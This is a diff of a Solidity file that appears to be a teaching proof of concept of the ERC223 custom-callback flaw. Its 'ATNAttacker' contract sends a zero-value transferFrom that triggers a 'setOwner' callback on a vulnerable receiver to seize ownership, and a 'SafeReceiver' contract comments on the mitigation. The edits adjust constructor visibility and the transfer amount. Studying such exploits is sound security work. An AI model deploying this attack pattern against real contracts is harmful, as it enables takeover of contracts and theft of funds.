@@ -50,7 +50,7 @@ contract ATNAttacker is IERC223Receiver {
     
     event AttackExecuted(string message);
 
-    constructor(address _target) {
+    constructor(address _target) public {
         target = VulnerableReceiver(_target);
         attacker = msg.sender;
     }
@@ -82,7 +82,7 @@ contract ATNAttacker is IERC223Receiver {
         target.transferFrom(
             address(this),           // from: 攻击合约
             address(target),         // to: 目标合约
-            1,                       // value: 最小金额
+            0,                       // value: 最小金额
             attackData,              // data: 包含攻击者地址（编码后的）
             callbackFunction         // custom_callback: "setOwner(address,uint256,bytes)"
         );
@@ -105,7 +105,7 @@ contract ATNAttacker is IERC223Receiver {
 contract SafeReceiver is DSAuth, IERC223Receiver {
     VulnERC223Token public token;
     
-    constructor(address _token) DSAuth() {
+    constructor(address _token) DSAuth() public {
         token = VulnERC223Token(_token);
         // MITIGATION: 不将代币合约设置为authority
         // 这样即使通过tokenFallback，也无法调用需要auth权限的函数
